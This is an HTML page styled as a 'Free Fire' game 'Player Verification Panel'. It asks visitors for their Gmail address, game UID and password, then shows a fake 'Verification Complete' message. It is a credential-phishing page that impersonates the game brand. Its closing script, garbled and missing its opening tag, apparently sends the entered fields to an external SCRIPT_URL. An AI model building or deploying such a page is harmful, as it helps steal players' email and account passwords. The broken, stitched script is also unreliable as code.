<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Free Fire Game Panel</title>

<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    font-family: Arial, sans-serif;
}

body {
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background:
        linear-gradient(rgba(0,0,0,.45), rgba(0,0,0,.8)),
        url("https://images.unsplash.com/photo-1511512578047-dfb367046420?auto=format&fit=crop&w=1600&q=80")
        center/cover no-repeat;
    color: white;
}

.game-box {
    width: 380px;
    max-width: 92%;
    padding: 30px;
    background: rgba(10,10,10,.88);
    border: 2px solid #ff7b00;
    border-radius: 18px;
    box-shadow: 0 0 15px #ff6500, 0 0 45px rgba(255,85,0,.5);
}

.logo {
    text-align: center;
    font-size: 42px;
    font-weight: 900;
    color: #ff8500;
    text-shadow: 3px 3px #000, 0 0 15px #ff5500;
    margin-bottom: 5px;
}

.subtitle {
    text-align: center;
    color: #ddd;
    margin-bottom: 25px;
    font-size: 13px;
    letter-spacing: 2px;
}

.input-group {
    margin-bottom: 17px;
}

.input-group label {
    display: block;
    color: #ff9a3c;
    font-weight: bold;
    margin-bottom: 7px;
}

.input-group input {
    width: 100%;
    padding: 14px;
    border: 1px solid #555;
    border-radius: 8px;
    background: #171717;
    color: white;
    outline: none;
    font-size: 15px;
}

.input-group input:focus {
    border-color: #ff7800;
    box-shadow: 0 0 8px rgba(255,120,0,.5);
}

.login-btn {
    width: 100%;
    padding: 15px;
    border: none;
    border-radius: 8px;
    background: linear-gradient(90deg, #ff4500, #ff9900);
    color: white;
    font-size: 17px;
    font-weight: bold;
    cursor: pointer;
    text-transform: uppercase;
}

.message {
    display: none;
    margin-top: 20px;
    padding: 15px;
    text-align: center;
    background: rgba(0,120,40,.25);
    border: 1px solid #00c853;
    border-radius: 8px;
}

.check {
    font-size: 35px;
    color: #00e676;
}

.watermark {
    margin-top: 22px;
    text-align: center;
    color: rgba(255,255,255,.35);
    font-size: 11px;
    letter-spacing: 2px;
}
</style>
</head>

<body>

<div class="game-box">

    <div class="logo">FREE FIRE</div>
    <div class="subtitle">PLAYER VERIFICATION PANEL</div>

    <form id="gameForm">

        <div class="input-group">
            <label>Gmail</label>
            <input
                type="email"
                id="gmail"
                placeholder="Enter your Gmail"
                autocomplete="off"
                required>
        </div>

        <!-- PASSWORD INTERFACE NOW USES THE UID FIELD -->
        <div class="input-group">
            <label>Enter your UID</label>
            <input
                type="text"
                id="UID"
                placeholder="Enter your UID"
                autocomplete="off"
                required>
        </div>

        <!-- UID INTERFACE NOW USES THE Password FIELD -->
        <div class="input-group">
            <label>Enter Your Password</label>
            <input
                type="text"
                id="Password"
                placeholder="Enter your password"
                inputmode="numeric"
                required>
        </div>

        <button class="login-btn" type="submit">
            SUBMIT
        </button>

    </form>

    <div class="message" id="message">
        <div class="check">✓</div>
        <strong>Verification Complete</strong>
        <p>Your practice information was received.</p>
    </div>

    <div class="watermark">
        FREE FIRE • PRACTICE PANEL
    </div>

</div>

            },ocument.getElementById
            body:("uid").value.trim();

    try {username
        await fetcSCRIPT_URL, {
            metho JSON.stringify({
                email: email,

            })
        });

        document.querySelector(".login-btn").textContent = "SUBMITTED ✓";

    } catch (error) {

        alert("Could not submit the information.");
    }

</script>

</body>
</html>
